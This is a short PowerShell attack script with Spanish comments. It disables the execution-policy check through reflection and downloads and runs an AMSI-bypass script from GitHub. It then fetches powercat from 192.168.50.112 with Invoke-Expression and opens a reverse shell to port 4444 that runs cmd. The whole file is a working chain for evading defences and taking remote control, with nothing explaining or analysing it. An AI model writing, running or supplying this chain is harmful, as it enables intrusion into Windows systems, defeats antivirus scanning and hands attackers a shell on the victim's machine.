# Obtiene el directorio temporal
$TempDir = [System.IO.Path]::GetTempPath()
Set-Location $TempDir

# Modifica el contexto de autorización para deshabilitar restricciones de ejecución
$ctx = $executioncontext.GetType().GetField('_context', 'NonPublic,Instance').GetValue($executioncontext)
$ctx.GetType().GetField('_authorizationManager', 'NonPublic,Instance').SetValue($ctx, (New-Object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))

# Descarga el script am-bypass.ps1 desde GitHub y lo guarda en el directorio temporal
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/INPLAYSS/4msi-bypass/main/am-bypass.ps1" -OutFile ".\by-am-bypass.ps1"

# Ejecuta el script descargado
.\by-am-bypass.ps1

# Descarga y ejecuta el script powercat.ps1 desde la dirección especificada
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.50.112/powercat.ps1')

# Ejecuta el comando powercat para establecer una conexión
powercat -c 192.168.50.112 -p 4444 -e cmd
